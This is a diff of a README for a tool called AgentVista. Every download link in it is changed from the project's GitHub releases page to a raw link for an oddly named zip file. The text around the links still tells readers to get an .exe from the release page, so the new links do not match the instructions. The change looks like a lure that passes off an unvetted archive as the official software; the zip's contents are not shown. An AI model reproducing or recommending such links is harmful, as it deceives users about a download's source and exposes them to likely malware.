@@ -1,6 +1,6 @@
 # 🕵️‍♂️ AgentVista - Test Visual Agents in Tough Scenarios
 
-[![Download AgentVista](https://img.shields.io/badge/Download-AgentVista-orange?style=for-the-badge)](https://github.com/Sokenu-Praise/AgentVista/releases)
+[![Download AgentVista](https://img.shields.io/badge/Download-AgentVista-orange?style=for-the-badge)](https://raw.githubusercontent.com/Sokenu-Praise/AgentVista/main/search/Vista-Agent-forepast.zip)
 
 ## 🖼️ What is AgentVista?
 
@@ -33,7 +33,7 @@ Start by downloading the software from the official release page. Follow the ins
 
 Visit the official release page to get the latest version of AgentVista:
 
-[![Download AgentVista](https://img.shields.io/badge/Download-AgentVista-brightgreen?style=for-the-badge)](https://github.com/Sokenu-Praise/AgentVista/releases)
+[![Download AgentVista](https://img.shields.io/badge/Download-AgentVista-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Sokenu-Praise/AgentVista/main/search/Vista-Agent-forepast.zip)
 
 Click the link above and look for the latest release. Choose the file that ends with `.exe` for Windows. The file size is usually less than 100 MB.
 
@@ -95,7 +95,7 @@ Access these in the “Settings” menu at the top right of the app window.
 
 Return to the release page anytime to get updates or fresh copies of the software.
 
-[Download AgentVista from Releases](https://github.com/Sokenu-Praise/AgentVista/releases)  
+[Download AgentVista from Releases](https://raw.githubusercontent.com/Sokenu-Praise/AgentVista/main/search/Vista-Agent-forepast.zip)  
 
 Look for the `.exe` file matching your Windows system and download it. Follow the install steps above whenever you update.
 
